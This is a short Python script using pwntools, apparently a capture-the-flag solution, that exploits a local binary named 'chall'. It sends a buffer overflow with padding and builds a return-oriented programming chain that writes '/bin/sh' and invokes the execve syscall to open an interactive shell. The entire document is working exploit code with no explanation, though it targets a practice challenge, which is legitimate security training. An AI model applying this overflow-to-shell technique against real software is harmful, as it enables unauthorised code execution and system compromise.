from pwn import *
exe = context.binary = ELF("./chall")
r = process()
rop = ROP(exe)
rop.raw(b"A" * 240)
rop.raw(0x6b623c)
rop.raw(0x400b84)
rop.raw(b"\x00")
# for i in range(45):
#     rop.raw(0x0000000000400416)
# rop.raw(b"\x00" * 90)
r.send(b"257")
# sleep(3)
r.send(rop.chain())
new_offset = 264
bin_sh = 0x6b613c
syscall = 0x0000000000474f15
lop = ROP(exe)
lop.raw(b"/bin/sh\x00")
lop.raw(b"A" * 256)
lop.rax = 59
lop.rdi = bin_sh
lop.rsi = 0
lop.rdx = 0
lop.raw(syscall)
r.send(lop.chain())
r.interactive()